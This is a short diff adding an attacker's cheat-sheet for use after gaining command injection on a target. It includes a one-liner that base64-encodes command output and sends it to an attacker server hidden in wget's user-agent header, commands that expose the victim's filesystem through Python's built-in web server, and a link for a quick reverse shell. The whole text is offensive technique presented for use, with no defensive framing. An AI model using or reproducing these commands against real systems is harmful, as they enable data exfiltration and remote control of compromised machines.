@@ -1,0 +1,13 @@
+Note:
+All exploits here assume you have arbitrary command injection on the target system
+
+Send server data to attacker in UA string:
+<target-command (e.g. ls)>|base64|xargs wget <attacker-server> --user-agent
+
+
+expose filesystem usingPython web server:
+"python -m SimpleHTTPServer <port_num>" (if python2)
+"python3 -m http.server <port_num>" (if python3)
+
+EVEN FASTER REVERSE SHELL:
+https://shell.now.sh/
